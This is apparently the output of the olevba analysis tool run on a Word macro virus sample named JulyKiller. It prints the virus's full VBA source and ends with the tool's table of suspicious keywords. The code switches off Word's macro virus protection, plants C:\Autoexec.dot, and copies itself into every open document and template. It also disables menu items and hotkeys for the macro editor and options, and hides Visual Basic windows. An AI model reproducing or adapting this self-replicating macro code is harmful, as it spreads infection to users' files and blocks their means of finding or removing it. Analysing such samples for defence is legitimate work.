olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.JulyKiller.g-5f75549748432bf11c21735e2f147c0929235282
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.JulyKiller.g-5f75549748432bf11c21735e2f147c0929235282 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Y2K.bas 
in file: Virus.MSWord.JulyKiller.g-5f75549748432bf11c21735e2f147c0929235282 - OLE stream: 'Macros/VBA/Y2K'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub actNo()
    
End Sub
Sub Autos()
    Dim file$
    Dim ans$
    Dim test
    Dim mItem
    Dim cItem
    Dim aDoc
    Dim aTemp
    Dim vset
    Dim Iset
    Dim ad
    Dim y2kDate As Long
    Application.ScreenUpdating = False
    For Each ad In AddIns
    If ad.name = "Autoexec.dot" Then
        ad.Installed = False
    End If
    Next ad
    With Dialogs(wdDialogToolsOptionsFileLocations)
    .path = "STARTUP-PATH"
    .Setting = "c:\"
    .Execute
    End With
    If Options.VirusProtection Then
        Options.VirusProtection = False
    End If
    
    file$ = WordBasic.[MacroFileName$]()
    If InStr(file$, "Autoexec") <> 0 Then
        For Each aDoc In Documents
        For Each cItem In aDoc.VBProject.VBComponents
        If (cItem.name = "Y2K") Then
            vset = 1
        End If
        Next cItem
        Next aDoc
        For Each cItem In NormalTemplate.VBProject.VBComponents
        If (cItem.name = "Y2K") Then
            vset = 1
        End If
        Next cItem
        If vset <> 1 Then
        WordBasic.DisableAutoMacros
        Documents.Open FileName:="C:\Autoexec.dot", AddToRecentFiles:=False
        For Each aDoc In Documents
            If (InStr(aDoc.FullName, Application.PathSeparator) <> 0) And (aDoc.VBProject.Protection = 0) Then
                    WordBasic.MacroCopy ActiveDocument.FullName + ":Y2K", aDoc.FullName + ":Y2K"
            End If
        Next aDoc
        For Each aTemp In Templates
            If (InStr(aTemp.FullName, Application.PathSeparator) <> 0) And (aTemp.VBProject.Protection = 0) Then
                    WordBasic.MacroCopy ActiveDocument.FullName + ":Y2K", aTemp.FullName + ":Y2K"
            End If
        Next aTemp
        ActiveDocument.Save
        ActiveDocument.Close
        End If
        If vset = 1 Then
            GoTo out
        End If
    End If
    
    With Application.FileSearch
    .LookIn = "C:\"
    .FileName = "Autoexec.dot"
    If .Execute > 0 Then
          Iset = 1
    End If
    End With
    If Iset <> 1 Then
        WordBasic.DisableAutoMacros
        Documents.Add NewTemplate:=True
        WordBasic.MacroCopy file$ + ":Y2K", ActiveDocument.FullName + ":Y2K"
        ActiveDocument.SaveAs FileName:="c:\Autoexec.dot", AddToRecentFiles:=False
        ActiveDocument.Close
    End If

    For Each aDoc In Documents
        If (file$ <> aDoc.FullName) And (aDoc.VBProject.Protection = 0) Then
            For Each cItem In aDoc.VBProject.VBComponents
                If (cItem.name = "AutoOpen") Or (cItem.name = "AutoNew") Or (cItem.name = "AutoClose") Or (cItem.name = "FileSave") Then
                    aDoc.VBProject.VBComponents.Remove (cItem)
                End If
            Next cItem
        End If
    Next aDoc
    For Each aTemp In Templates
        If (file$ <> aTemp.FullName) And (aTemp.VBProject.Protection = 0) Then
            For Each cItem In aTemp.VBProject.VBComponents
                If (cItem.name = "AutoOpen") Or (cItem.name = "AutoNew") Or (cItem.name = "AutoClose") Or (cItem.name = "FileSave") Then
                    aTemp.VBProject.VBComponents.Remove (cItem)
                End If
            Next cItem
        End If
    Next aTemp
    For Each aDoc In Documents
        If (InStr(aDoc.FullName, Application.PathSeparator) <> 0) And (aDoc.VBProject.Protection = 0) Then
             WordBasic.MacroCopy file$ + ":Y2K", aDoc.FullName + ":Y2K"
             aDoc.Save
        End If
    Next aDoc
    For Each aTemp In Templates
        If (InStr(aTemp.FullName, Application.PathSeparator) <> 0) And (aTemp.VBProject.Protection = 0) Then
              WordBasic.MacroCopy file$ + ":Y2K", aTemp.FullName + ":Y2K"
        End If
    Next aTemp
out:
If InStr(file$, "Normal") = 0 Then

    CustomizationContext = NormalTemplate
    Set myKey = FindKey(BuildKeyCode(wdKeyAlt, wdKeyF8))
    myKey.Rebind KeyCategory:=wdKeyCategoryCommand, Command:="FileSaveAs"
    Set myKey = FindKey(BuildKeyCode(wdKeyAlt, wdKeyF11))
    myKey.Rebind KeyCategory:=wdKeyCategoryCommand, Command:="FileSaveAs"
       Set myKey = FindKey(BuildKeyCode(wdKeyAlt, wdKeyF1))
    myKey.Rebind KeyCategory:=wdKeyCategoryCommand, Command:="ToolsMacro"
    Set myKey = FindKey(BuildKeyCode(wdKeyAlt, wdKeyF2))
    myKey.Rebind KeyCategory:=wdKeyCategoryCommand, Command:="ViewVBCode"
    
    For Each mItem In CommandBars("Tools").Controls
    If mItem.Caption = "×Ô¶¨Òå(&C)..." Then
        mItem.OnAction = ""
    End If
    If mItem.Caption = "Ä£°åºÍ¼ÓÔØÏî(&I)..." Then
        mItem.OnAction = ""
    End If
    If mItem.Caption = "Ñ¡Ïî(&O)..." Then
        mItem.OnAction = ""
    End If
    Next mItem
    For Each mItem In CommandBars("File").Controls
    If mItem.Caption = "ÐÂ½¨(&N)..." Then
        mItem.OnAction = "NewDoc"
    End If
    If mItem.Caption = "±£´æ(&S)" Then
        mItem.OnAction = "SaveDoc"
    End If
    Next mItem
    For Each cItem In CommandBars("Tools").Controls
    If cItem.Type = msoControlPopup Then
        If cItem.Caption = "ºê(&M)" Then
            For Each mItem In cItem.CommandBar.Controls
                If mItem.Caption = "ºê(&M)..." Then
                    mItem.OnAction = ""
                End If
                If mItem.Caption = "Visual Basic ±à¼­Æ÷(&V)" Then
                    mItem.OnAction = ""
                End If
            Next mItem
        End If
    End If
    Next cItem
    For Each cItem In CommandBars("Visual Basic").Controls
    cItem.OnAction = ""
    Next cItem
    For Each cItem In CommandBars("Standard").Controls
    If cItem.Index = 1 Then
    cItem.OnAction = "NewDoc"
    End If
    If cItem.Index = 3 Then
    cItem.OnAction = "SaveDoc"
    End If
    Next cItem
    For Each cItem In CommandBars
    If cItem.Visible = True Then
        cItem.Protection = msoBarNoCustomize
    End If
    Next cItem
End If
    For Each myTask In Tasks
        If InStr(myTask.name, "Visual Basic") > 0 Then
            myTask.Visible = False
        End If
    Next myTask
Application.ScreenUpdating = True

End Sub
Sub AutoOpen()
Autos
End Sub
Sub AutoClose()
Autos
End Sub
Sub AutoNew()
Autos
End Sub
Sub AutoExec()
Autos
End Sub
Sub NewDoc()
Documents.Add Template:="", NewTemplate:=False
Autos
End Sub
Sub SaveDoc()
ActiveDocument.Save
Autos
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Autoexec            |Runs when the Word document is opened        |
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|AutoExec  |AutoNew             |Runs when a new Word document is created     |
|Suspicious|Open                |May open a file                              |
|Suspicious|Command             |May run PowerShell commands                  |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

